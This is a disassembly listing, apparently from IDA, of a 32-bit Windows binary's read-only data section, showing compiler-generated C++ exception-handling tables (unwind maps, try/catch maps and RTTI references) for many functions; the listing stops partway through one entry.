dword_6AF62324	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF62348o
		dd offset dword_6AF62304
dword_6AF62338	dd 19930520h, 3		; DATA XREF: unknown_libname_34o
		dd offset dword_6AF622EC
		dd 1
		dd offset dword_6AF62324
		dd 2 dup(0)
dword_6AF62354	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF623B8o
		dd offset sub_6AF52EE1
		align 10h
		dd offset sub_6AF52EE9
		dd 1
		dd offset sub_6AF52EF1
		dd 2, 0
		dd 2, 0
dword_6AF6237C	dd 8			; DATA XREF: .rdata:6AF623ACo
		dd offset off_6AF680CC
		dd 0FFFFFF9Ch
		dd offset loc_6AF34AF1
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFA0h
		dd offset loc_6AF34B34
dword_6AF6239C	dd 2 dup(3), 4,	2	; DATA XREF: .rdata:6AF623C0o
		dd offset dword_6AF6237C
dword_6AF623B0	dd 19930520h, 5		; DATA XREF: unknown_libname_35o
		dd offset dword_6AF62354
		dd 1
		dd offset dword_6AF6239C
		dd 2 dup(0)
dword_6AF623CC	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62420o
		dd offset sub_6AF52F03
		dd 4 dup(0)
dword_6AF623E4	dd 8			; DATA XREF: .rdata:6AF62414o
		dd offset off_6AF680CC
		dd 0FFFFFFA0h
		dd offset loc_6AF34D46
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFF9Ch
		dd offset loc_6AF34D89
dword_6AF62404	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF62428o
		dd offset dword_6AF623E4
dword_6AF62418	dd 19930520h, 3		; DATA XREF: unknown_libname_36o
		dd offset dword_6AF623CC
		dd 1
		dd offset dword_6AF62404
		dd 2 dup(0)
dword_6AF62434	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62490o
		dd offset sub_6AF52F15
		align 10h
		dd offset sub_6AF52F1D
		dd 1, 0
		dd 1, 0
dword_6AF62454	dd 8			; DATA XREF: .rdata:6AF62484o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF34F4C
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF34F8F
dword_6AF62474	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF62498o
		dd offset dword_6AF62454
dword_6AF62488	dd 19930520h, 4		; DATA XREF: unknown_libname_37o
		dd offset dword_6AF62434
		dd 1
		dd offset dword_6AF62474
		dd 2 dup(0)
dword_6AF624A4	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62500o
		dd offset sub_6AF52F2F
		align 10h
		dd offset sub_6AF52F37
		dd 1, 0
		dd 1, 0
dword_6AF624C4	dd 8			; DATA XREF: .rdata:6AF624F4o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF350A4
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF350E7
dword_6AF624E4	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF62508o
		dd offset dword_6AF624C4
dword_6AF624F8	dd 19930520h, 4		; DATA XREF: unknown_libname_38o
		dd offset dword_6AF624A4
		dd 1
		dd offset dword_6AF624E4
		dd 2 dup(0)
stru_6AF62514	_msExcInfo <-1,	offset sub_6AF52F49> ; DATA XREF: .rdata:stru_6AF6251Co
stru_6AF6251C	_msExcept7 <19930520h, 1, offset stru_6AF62514,	0, 0, 0>
					; DATA XREF: unknown_libname_39o
stru_6AF62538	_msExcInfo <-1,	offset sub_6AF52F5B> ; DATA XREF: .rdata:stru_6AF62540o
stru_6AF62540	_msExcept7 <19930520h, 1, offset stru_6AF62538,	0, 0, 0>
					; DATA XREF: unknown_libname_40o
stru_6AF6255C	_msExcInfo <-1,	offset sub_6AF52F6E> ; DATA XREF: .rdata:stru_6AF62564o
stru_6AF62564	_msExcept7 <19930520h, 1, offset stru_6AF6255C,	0, 0, 0>
					; DATA XREF: unknown_libname_41o
stru_6AF62580	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF625B4o
stru_6AF62590	_msRttiDscr <0,	0, 0, offset sub_6AF362F6>
					; DATA XREF: .rdata:stru_6AF625A0o
stru_6AF625A0	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF625B4o
		dd 1			; Count
		dd offset stru_6AF62590	; RttiBlkPtr
stru_6AF625B4	_msExcept7 <19930520h, 2, offset stru_6AF62580,	1, \
					; DATA XREF: unknown_libname_42o
			    offset stru_6AF625A0, 0>
stru_6AF625D0	_msExcInfo <-1,	offset sub_6AF52F8B> ; DATA XREF: .rdata:stru_6AF625E0o
		_msExcInfo <0, offset sub_6AF52F93>
stru_6AF625E0	_msExcept7 <19930520h, 2, offset stru_6AF625D0,	0, 0, 0>
					; DATA XREF: unknown_libname_43o
dword_6AF625FC	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62650o
		dd offset sub_6AF52FA8
		dd 4 dup(0)
dword_6AF62614	dd 8			; DATA XREF: .rdata:6AF62644o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF368B2
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF368F5
dword_6AF62634	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF62658o
		dd offset dword_6AF62614
dword_6AF62648	dd 19930520h, 3		; DATA XREF: unknown_libname_44o
		dd offset dword_6AF625FC
		dd 1
		dd offset dword_6AF62634
		dd 2 dup(0)
dword_6AF62664	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF626B8o
		dd offset sub_6AF52FBA
		dd 4 dup(0)
dword_6AF6267C	dd 8			; DATA XREF: .rdata:6AF626ACo
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF36A33
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF36A76
dword_6AF6269C	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF626C0o
		dd offset dword_6AF6267C
dword_6AF626B0	dd 19930520h, 3		; DATA XREF: unknown_libname_45o
		dd offset dword_6AF62664
		dd 1
		dd offset dword_6AF6269C
		dd 2 dup(0)
dword_6AF626CC	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62720o
		dd offset sub_6AF52FCC
		dd 4 dup(0)
dword_6AF626E4	dd 8			; DATA XREF: .rdata:6AF62714o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF380D5
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFACh
		dd offset loc_6AF38118
dword_6AF62704	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF62728o
		dd offset dword_6AF626E4
dword_6AF62718	dd 19930520h, 3		; DATA XREF: unknown_libname_46o
		dd offset dword_6AF626CC
		dd 1
		dd offset dword_6AF62704
		dd 2 dup(0)
dword_6AF62734	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62788o
		dd offset sub_6AF52FDE
		dd 4 dup(0)
dword_6AF6274C	dd 8			; DATA XREF: .rdata:6AF6277Co
		dd offset off_6AF680CC
		dd 0FFFFFFE8h
		dd offset loc_6AF38416
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFD4h
		dd offset loc_6AF38459
dword_6AF6276C	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF62790o
		dd offset dword_6AF6274C
dword_6AF62780	dd 19930520h, 3		; DATA XREF: unknown_libname_47o
		dd offset dword_6AF62734
		dd 1
		dd offset dword_6AF6276C
		dd 2 dup(0)
dword_6AF6279C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF627F0o
		dd offset sub_6AF52FF0
		dd 4 dup(0)
dword_6AF627B4	dd 8			; DATA XREF: .rdata:6AF627E4o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF38603
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF38646
dword_6AF627D4	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF627F8o
		dd offset dword_6AF627B4
dword_6AF627E8	dd 19930520h, 3		; DATA XREF: unknown_libname_48o
		dd offset dword_6AF6279C
		dd 1
		dd offset dword_6AF627D4
		dd 2 dup(0)
dword_6AF62804	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62860o
		dd offset sub_6AF53002
		align 10h
		dd offset sub_6AF5300A
		dd 1, 0
		dd 1, 0
dword_6AF62824	dd 8			; DATA XREF: .rdata:6AF62854o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF38CF5
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF38D38
dword_6AF62844	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF62868o
		dd offset dword_6AF62824
dword_6AF62858	dd 19930520h, 4		; DATA XREF: unknown_libname_49o
		dd offset dword_6AF62804
		dd 1
		dd offset dword_6AF62844
		dd 2 dup(0)
dword_6AF62874	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF628D0o
		dd offset sub_6AF5301C
		align 10h
		dd offset sub_6AF53024
		dd 1, 0
		dd 1, 0
dword_6AF62894	dd 8			; DATA XREF: .rdata:6AF628C4o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF38EFB
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF38F3E
dword_6AF628B4	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF628D8o
		dd offset dword_6AF62894
dword_6AF628C8	dd 19930520h, 4		; DATA XREF: unknown_libname_50o
		dd offset dword_6AF62874
		dd 1
		dd offset dword_6AF628B4
dword_6AF628DC	dd 3 dup(0)		; DATA XREF: .rdata:6AF62904o
		dd offset off_6AF680E8
		align 10h
		dd 0FFFFFFFFh, 0
		dd 4
		dd offset Ordinal309
dword_6AF62900	dd 1			; DATA XREF: .rdata:6AF62914o
		dd offset dword_6AF628DC+8
dword_6AF62908	dd 0			; DATA XREF: Ordinal345+12o
					; Ordinal347+12o ...
		dd offset Ordinal310
		dd 0
		dd offset dword_6AF62900
dword_6AF62918	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF6296Co
		dd offset sub_6AF53036
		dd 4 dup(0)
dword_6AF62930	dd 8			; DATA XREF: .rdata:6AF62960o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF3A66E
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFACh
		dd offset loc_6AF3A6B1
dword_6AF62950	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF62974o
		dd offset dword_6AF62930
dword_6AF62964	dd 19930520h, 3		; DATA XREF: unknown_libname_51o
		dd offset dword_6AF62918
		dd 1
		dd offset dword_6AF62950
		align 10h
dword_6AF62980	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF629D4o
		dd offset sub_6AF53048
		dd 4 dup(0)
dword_6AF62998	dd 8			; DATA XREF: .rdata:6AF629C8o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF3A7E2
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFACh
		dd offset loc_6AF3A825
dword_6AF629B8	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF629DCo
		dd offset dword_6AF62998
dword_6AF629CC	dd 19930520h, 3		; DATA XREF: unknown_libname_52o
		dd offset dword_6AF62980
		dd 1
		dd offset dword_6AF629B8
		dd 2 dup(0)
dword_6AF629E8	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62A54o
		dd offset sub_6AF5305A
		dd 2 dup(0)
		dd 1
		dd offset sub_6AF53062
		dd 2
		dd offset sub_6AF5306A
		dd 3
		dd offset sub_6AF53072
		dd 2 dup(0)
dword_6AF62A18	dd 8			; DATA XREF: .rdata:6AF62A48o
		dd offset off_6AF680CC
		dd 0FFFFFF9Ch
		dd offset sub_6AF3B4AD
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFF98h
		dd offset sub_6AF3B4F0
dword_6AF62A38	dd 1, 4, 5, 2		; DATA XREF: .rdata:6AF62A5Co
		dd offset dword_6AF62A18
dword_6AF62A4C	dd 19930520h, 6		; DATA XREF: unknown_libname_53o
		dd offset dword_6AF629E8
		dd 1
		dd offset dword_6AF62A38
		dd 2 dup(0)
dword_6AF62A68	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62AC4o
		dd offset sub_6AF53084
		dd 0
		dd offset sub_6AF5308C
		dd 1, 0
		dd 1, 0
dword_6AF62A88	dd 8			; DATA XREF: .rdata:6AF62AB8o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF3B6FC
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF3B73F
dword_6AF62AA8	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF62ACCo
		dd offset dword_6AF62A88
dword_6AF62ABC	dd 19930520h, 4		; DATA XREF: unknown_libname_54o
		dd offset dword_6AF62A68
		dd 1
		dd offset dword_6AF62AA8
		dd 2 dup(0)
dword_6AF62AD8	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62B34o
		dd offset sub_6AF5309E
		dd 0
		dd offset sub_6AF530A6
		dd 1, 0
		dd 1, 0
dword_6AF62AF8	dd 8			; DATA XREF: .rdata:6AF62B28o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset sub_6AF3B942
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFACh
		dd offset sub_6AF3B985
dword_6AF62B18	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF62B3Co
		dd offset dword_6AF62AF8
dword_6AF62B2C	dd 19930520h, 4		; DATA XREF: unknown_libname_55o
		dd offset dword_6AF62AD8
		dd 1
		dd offset dword_6AF62B18
		dd 2 dup(0)
stru_6AF62B48	_msExcInfo <-1,	offset sub_6AF530B8> ; DATA XREF: .rdata:stru_6AF62B50o
stru_6AF62B50	_msExcept7 <19930520h, 1, offset stru_6AF62B48,	0, 0, 0>
					; DATA XREF: unknown_libname_56o
stru_6AF62B6C	_msExcInfo <-1,	offset sub_6AF530CB> ; DATA XREF: .rdata:stru_6AF62B74o
stru_6AF62B74	_msExcept7 <19930520h, 1, offset stru_6AF62B6C,	0, 0, 0>
					; DATA XREF: unknown_libname_57o
stru_6AF62B90	_msExcInfo <-1,	offset sub_6AF530E0> ; DATA XREF: .rdata:stru_6AF62B98o
stru_6AF62B98	_msExcept7 <19930520h, 1, offset stru_6AF62B90,	0, 0, 0>
					; DATA XREF: unknown_libname_58o
stru_6AF62BB4	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF62BE8o
stru_6AF62BC4	_msRttiDscr <0,	0, 0, offset loc_6AF3CDB6>
					; DATA XREF: .rdata:stru_6AF62BD4o
stru_6AF62BD4	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF62BE8o
		dd 1			; Count
		dd offset stru_6AF62BC4	; RttiBlkPtr
stru_6AF62BE8	_msExcept7 <19930520h, 2, offset stru_6AF62BB4,	1, \
					; DATA XREF: unknown_libname_59o
			    offset stru_6AF62BD4, 0>
stru_6AF62C04	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF62C38o
stru_6AF62C14	_msRttiDscr <0,	0, 0, offset loc_6AF3CEE2>
					; DATA XREF: .rdata:stru_6AF62C24o
stru_6AF62C24	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF62C38o
		dd 1			; Count
		dd offset stru_6AF62C14	; RttiBlkPtr
stru_6AF62C38	_msExcept7 <19930520h, 2, offset stru_6AF62C04,	1, \
					; DATA XREF: unknown_libname_60o
			    offset stru_6AF62C24, 0>
stru_6AF62C54	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF62C88o
stru_6AF62C64	_msRttiDscr <0,	0, 0, offset loc_6AF3CF7F>
					; DATA XREF: .rdata:stru_6AF62C74o
stru_6AF62C74	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF62C88o
		dd 1			; Count
		dd offset stru_6AF62C64	; RttiBlkPtr
stru_6AF62C88	_msExcept7 <19930520h, 2, offset stru_6AF62C54,	1, \
					; DATA XREF: unknown_libname_61o
			    offset stru_6AF62C74, 0>
stru_6AF62CA4	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF62CD8o
stru_6AF62CB4	_msRttiDscr <0,	0, 0, offset loc_6AF3D01D>
					; DATA XREF: .rdata:stru_6AF62CC4o
stru_6AF62CC4	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF62CD8o
		dd 1			; Count
		dd offset stru_6AF62CB4	; RttiBlkPtr
stru_6AF62CD8	_msExcept7 <19930520h, 2, offset stru_6AF62CA4,	1, \
					; DATA XREF: unknown_libname_62o
			    offset stru_6AF62CC4, 0>
dword_6AF62CF4	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62D6Co
		dd offset sub_6AF53120
dword_6AF62CFC	dd 0Bh dup(0)
		dd offset loc_6AF3D361
dword_6AF62D2C	dd 3 dup(0)		; DATA XREF: .rdata:6AF62D60o
		dd offset loc_6AF3D3E3
dword_6AF62D3C	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF62D74o
		dd offset dword_6AF62CFC+20h
		dd 2 dup(3), 4,	1
		dd offset dword_6AF62D2C
dword_6AF62D64	dd 19930520h, 5		; DATA XREF: unknown_libname_63o
		dd offset dword_6AF62CF4
		dd 2
		dd offset dword_6AF62D3C
		align 10h
dword_6AF62D80	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62DF8o
		dd offset sub_6AF53132
dword_6AF62D88	dd 0Bh dup(0)
		dd offset loc_6AF3D57A
dword_6AF62DB8	dd 3 dup(0)		; DATA XREF: .rdata:6AF62DECo
		dd offset loc_6AF3D5FE
dword_6AF62DC8	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF62E00o
		dd offset dword_6AF62D88+20h
		dd 2 dup(3), 4,	1
		dd offset dword_6AF62DB8
dword_6AF62DF0	dd 19930520h, 5		; DATA XREF: unknown_libname_64o
		dd offset dword_6AF62D80
		dd 2
		dd offset dword_6AF62DC8
		dd 2 dup(0)
dword_6AF62E0C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62E70o
		dd offset sub_6AF53144
		dd 2 dup(0)
		dd 1
		dd offset sub_6AF5314C
		dd 2
		dd offset sub_6AF53154
		dd 2 dup(0)
dword_6AF62E34	dd 8			; DATA XREF: .rdata:6AF62E64o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset sub_6AF3D91C
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset sub_6AF3D95F
dword_6AF62E54	dd 1, 3, 4, 2		; DATA XREF: .rdata:6AF62E78o
		dd offset dword_6AF62E34
dword_6AF62E68	dd 19930520h, 5		; DATA XREF: unknown_libname_65o
		dd offset dword_6AF62E0C
		dd 1
		dd offset dword_6AF62E54
		dd 2 dup(0)
dword_6AF62E84	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62EF0o
		dd offset sub_6AF53166
		dd 2 dup(0)
		dd 1
		dd offset sub_6AF5316E
		dd 2
		dd offset sub_6AF53176
		dd 2
		dd offset sub_6AF5317E
		dd 2 dup(0)
dword_6AF62EB4	dd 8			; DATA XREF: .rdata:6AF62EE4o
		dd offset off_6AF680CC
		dd 0FFFFFFA4h
		dd offset sub_6AF3DB0F
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFA8h
		dd offset sub_6AF3DB52
dword_6AF62ED4	dd 1, 4, 5, 2		; DATA XREF: .rdata:6AF62EF8o
		dd offset dword_6AF62EB4
dword_6AF62EE8	dd 19930520h, 6		; DATA XREF: unknown_libname_66o
		dd offset dword_6AF62E84
		dd 1
		dd offset dword_6AF62ED4
		dd 2 dup(0)
dword_6AF62F04	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62F78o
		dd offset sub_6AF53190
		dd 2 dup(0)
		dd 1
		dd offset sub_6AF53198
		dd 2
		dd offset sub_6AF531A0
		dd 3
		dd offset sub_6AF531A8
		dd 3
		dd offset sub_6AF531B0
		dd 2 dup(0)
dword_6AF62F3C	dd 8			; DATA XREF: .rdata:6AF62F6Co
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset sub_6AF3DD5F
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset sub_6AF3DDA2
dword_6AF62F5C	dd 1, 5, 6, 2		; DATA XREF: .rdata:6AF62F80o
		dd offset dword_6AF62F3C
dword_6AF62F70	dd 19930520h, 7		; DATA XREF: unknown_libname_67o
		dd offset dword_6AF62F04
		dd 1
		dd offset dword_6AF62F5C
		dd 2 dup(0)
dword_6AF62F8C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62FF0o
		dd offset sub_6AF531C2
		align 8
		dd offset sub_6AF531CA
		dd 1
		dd offset sub_6AF531D2
		dd 2, 0
		dd 2, 0
dword_6AF62FB4	dd 8			; DATA XREF: .rdata:6AF62FE4o
		dd offset off_6AF680CC
		dd 0FFFFFFACh
		dd offset loc_6AF3F07B
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFA8h
		dd offset loc_6AF3F0BE
dword_6AF62FD4	dd 2 dup(3), 4,	2	; DATA XREF: .rdata:6AF62FF8o
		dd offset dword_6AF62FB4
dword_6AF62FE8	dd 19930520h, 5		; DATA XREF: unknown_libname_68o
		dd offset dword_6AF62F8C
		dd 1
		dd offset dword_6AF62FD4
		dd 2 dup(0)
dword_6AF63004	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63060o
		dd offset sub_6AF531E4
		align 10h
		dd offset sub_6AF531EC
		dd 1, 0
		dd 1, 0
dword_6AF63024	dd 8			; DATA XREF: .rdata:6AF63054o
		dd offset off_6AF680CC
		dd 0FFFFFFB4h
		dd offset sub_6AF3F2A4
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB8h
		dd offset sub_6AF3F2E7
dword_6AF63044	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF63068o
		dd offset dword_6AF63024
dword_6AF63058	dd 19930520h, 4		; DATA XREF: unknown_libname_69o
		dd offset dword_6AF63004
		dd 1
		dd offset dword_6AF63044
		dd 2 dup(0)
dword_6AF63074	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF630E0o
		dd offset sub_6AF531FE
		align 10h
		dd offset sub_6AF53206
		dd 1
		dd offset sub_6AF53211
		dd 2, 0
		dd 3
		dd offset sub_6AF53219
		dd 2, 0
dword_6AF630A4	dd 8			; DATA XREF: .rdata:6AF630D4o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF3FDD3
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF3FE16
dword_6AF630C4	dd 3, 4, 5, 2		; DATA XREF: .rdata:6AF630E8o
		dd offset dword_6AF630A4
dword_6AF630D8	dd 19930520h, 6		; DATA XREF: unknown_libname_70o
		dd offset dword_6AF63074
		dd 1
		dd offset dword_6AF630C4
		dd 2 dup(0)
dword_6AF630F4	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63160o
		dd offset sub_6AF5322E
		align 10h
		dd offset sub_6AF53236
		dd 1
		dd offset sub_6AF5323E
		dd 2, 0
		dd 3
		dd offset sub_6AF53246
		dd 2, 0
dword_6AF63124	dd 8			; DATA XREF: .rdata:6AF63154o
		dd offset off_6AF680CC
		dd 0FFFFFF9Ch
		dd offset loc_6AF40099
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFACh
		dd offset loc_6AF400DC
dword_6AF63144	dd 3, 4, 5, 2		; DATA XREF: .rdata:6AF63168o
		dd offset dword_6AF63124
dword_6AF63158	dd 19930520h, 6		; DATA XREF: unknown_libname_71o
		dd offset dword_6AF630F4
		dd 1
		dd offset dword_6AF63144
		dd 2 dup(0)
dword_6AF63174	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF631D0o
		dd offset sub_6AF5325B
		align 10h
		dd offset sub_6AF53263
		dd 1, 0
		dd 1, 0
dword_6AF63194	dd 8			; DATA XREF: .rdata:6AF631C4o
		dd offset off_6AF680CC
		dd 0FFFFFFB4h
		dd offset sub_6AF4024E
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB8h
		dd offset sub_6AF40291
dword_6AF631B4	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF631D8o
		dd offset dword_6AF63194
dword_6AF631C8	dd 19930520h, 4		; DATA XREF: unknown_libname_72o
		dd offset dword_6AF63174
		dd 1
		dd offset dword_6AF631B4
		dd 2 dup(0)
dword_6AF631E4	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63228o
		dd offset sub_6AF53275
		dd 4 dup(0)
dword_6AF631FC	dd 8			; DATA XREF: .rdata:6AF6321Co
		dd offset stru_6AF68034
		align 8
		dd offset loc_6AF428E4
dword_6AF6320C	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF63230o
		dd offset dword_6AF631FC
dword_6AF63220	dd 19930520h, 3		; DATA XREF: unknown_libname_73o
		dd offset dword_6AF631E4
		dd 1
		dd offset dword_6AF6320C
		dd 2 dup(0)
dword_6AF6323C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63280o
		dd offset sub_6AF53287
		dd 4 dup(0)
dword_6AF63254	dd 8			; DATA XREF: .rdata:6AF63274o
		dd offset stru_6AF68034
		align 10h
		dd offset loc_6AF42ACF
dword_6AF63264	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF63288o
		dd offset dword_6AF63254
dword_6AF63278	dd 19930520h, 3		; DATA XREF: unknown_libname_74o
		dd offset dword_6AF6323C
		dd 1
		dd offset dword_6AF63264
		dd 2 dup(0)
stru_6AF63294	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF632C8o
stru_6AF632A4	_msRttiDscr <8,	offset stru_6AF68034, 0, offset	loc_6AF42BED>
					; DATA XREF: .rdata:stru_6AF632B4o
stru_6AF632B4	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF632C8o
		dd 1			; Count
		dd offset stru_6AF632A4	; RttiBlkPtr
stru_6AF632C8	_msExcept7 <19930520h, 2, offset stru_6AF63294,	1, \
					; DATA XREF: unknown_libname_75o
			    offset stru_6AF632B4, 0>
stru_6AF632E4	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF63318o
stru_6AF632F4	_msRttiDscr <8,	offset stru_6AF68034, 0, offset	loc_6AF42D9A>
					; DATA XREF: .rdata:stru_6AF63304o
stru_6AF63304	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF63318o
		dd 1			; Count
		dd offset stru_6AF632F4	; RttiBlkPtr
stru_6AF63318	_msExcept7 <19930520h, 2, offset stru_6AF632E4,	1, \
					; DATA XREF: unknown_libname_76o
			    offset stru_6AF63304, 0>
stru_6AF63334	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF63368o
stru_6AF63344	_msRttiDscr <8,	offset stru_6AF68034, 0, offset	loc_6AF42DF7>
					; DATA XREF: .rdata:stru_6AF63354o
stru_6AF63354	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF63368o
		dd 1			; Count
		dd offset stru_6AF63344	; RttiBlkPtr
stru_6AF63368	_msExcept7 <19930520h, 2, offset stru_6AF63334,	1, \
					; DATA XREF: unknown_libname_77o
			    offset stru_6AF63354, 0>
dword_6AF63384	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF633E0o
		dd offset sub_6AF532B7
		align 10h
		dd offset sub_6AF532BF
		dd 1, 0
		dd 1, 0
dword_6AF633A4	dd 8			; DATA XREF: .rdata:6AF633D4o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF42FB6
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF42FF9
dword_6AF633C4	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF633E8o
		dd offset dword_6AF633A4
dword_6AF633D8	dd 19930520h, 4		; DATA XREF: unknown_libname_78o
		dd offset dword_6AF63384
		dd 1
		dd offset dword_6AF633C4
		dd 2 dup(0)
dword_6AF633F4	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63450o
		dd offset sub_6AF532D1
		align 10h
		dd offset sub_6AF532D9
		dd 1, 0
		dd 1, 0
dword_6AF63414	dd 8			; DATA XREF: .rdata:6AF63444o
		dd offset off_6AF680CC
		dd 0FFFFFFACh
		dd offset loc_6AF43866
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFA8h
		dd offset loc_6AF438A9
dword_6AF63434	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF63458o
		dd offset dword_6AF63414
dword_6AF63448	dd 19930520h, 4		; DATA XREF: unknown_libname_79o
		dd offset dword_6AF633F4
		dd 1
		dd offset dword_6AF63434
		dd 2 dup(0)
dword_6AF63464	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF634D0o
		dd offset sub_6AF532EB
		align 10h
		dd offset sub_6AF532F3
		dd 1
		dd offset sub_6AF532FE
		dd 2
		dd offset sub_6AF53306
		dd 3, 0
		dd 3, 0
dword_6AF63494	dd 8			; DATA XREF: .rdata:6AF634C4o
		dd offset off_6AF680CC
		dd 0FFFFFFA0h
		dd offset loc_6AF43AA9
		dd 8
		dd offset stru_6AF68034
